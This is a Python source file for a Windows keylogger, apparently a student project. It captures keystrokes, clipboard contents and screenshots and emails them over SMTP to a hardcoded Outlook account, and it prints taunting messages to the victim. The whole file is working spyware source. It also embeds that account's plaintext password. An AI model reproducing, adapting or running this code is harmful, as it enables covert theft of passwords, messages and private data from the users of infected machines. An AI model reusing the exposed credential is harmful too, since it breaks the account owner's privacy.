import getpass # get user name
from PIL import ImageGrab # import  to get screenshots
import time # tracking time
import pyautogui

import win32clipboard  #import we use to create the clipboard txt
from pynput.keyboard import Key, Listener # what we use to get the keystrokes
# emial imports
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib



print(
    "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
    "MINE. \nEnjoy using this computer while you still can!")

# All keys entered will be put in this txt file
keys_information = "key_log.txt"


clipboard_information = "clipboard.txt" #clipboard information will be stored here


screenshot_information = "screenshot.png" # screenshot information will be stored here


keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

time_iteration = 15
number_of_iterations_end = 3

email_address = "csproject432@outlook.com"  # Email we will send the email from
password = "s1339490"  # Password to email above

username = getpass.getuser()

toaddr = "csproject432@outlook.com"  # Email we will be emailing(ourselfs)

file_path = "D:\\pythonProject\\"  # File path where all the textfiles will be place
extend = "\\"
file_merge = file_path + extend

# Code for recording our screen
# Screen resolution
SCREEN_SIZE = tuple(pyautogui.size())

# fourcc = cv2.VideoWriter_fourcc(*"XVID")

# Frames per second
fps = 30.0

# out = cv2.VideoWriter(video_information, fourcc, fps, SCREEN_SIZE)

vid_time = time_iteration


# email controls
def send_email(filename, attachment, toaddr): # get file we send along with the address to send it to
    fromaddr = email_address # email that will be sent from

    msg = MIMEMultipart() #allows us to format messages for text or images

    msg['From'] = fromaddr # enter the email into the from part of the message

    msg['To'] = toaddr #email being sent the msg

    msg['Subject'] = "Log File" # subject line will just say log file each time

    body = "Look at all the goods I got from this pc" # msg will send the info called along with this message

    msg.attach(MIMEText(body, 'plain'))

    # body = MIMEText("Look at all the goods I got from this pc", 'plain', 'utf-8')

    # msg.attach(body)

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.outlook.com', 587) # connect to outlook smtp

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()



t = 10
def countdown(t): # called to start timer of how long it tracks keystrokes

    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        time.sleep(1)
        t -= 1
    print("Thanks for the info, chump.")
    screenshot()
    copy_clipboard()
    send_email(clipboard_information, file_path + extend + clipboard_information, toaddr) # sends clipboard email
    send_email(keys_information, file_path + extend + keys_information, toaddr) # sends keys used email
    send_email(screenshot_information, file_path + extend + screenshot_information, toaddr) # sends screenshot email
    exit()





# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")




# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = [] # list for keys entered
    number_of_iterations += 1



    def on_press(key):
        global keys, count, currentTime

        print(key) # output each key entered
        keys.append(key) # add each key to our list
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")  #removes quotes around the key entered
                if k.find("space") > 0:
                    f.write('\n') # if there is a space create a new line in the file
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        countdown(int(t)) # calls the countdown function
        listener.join()
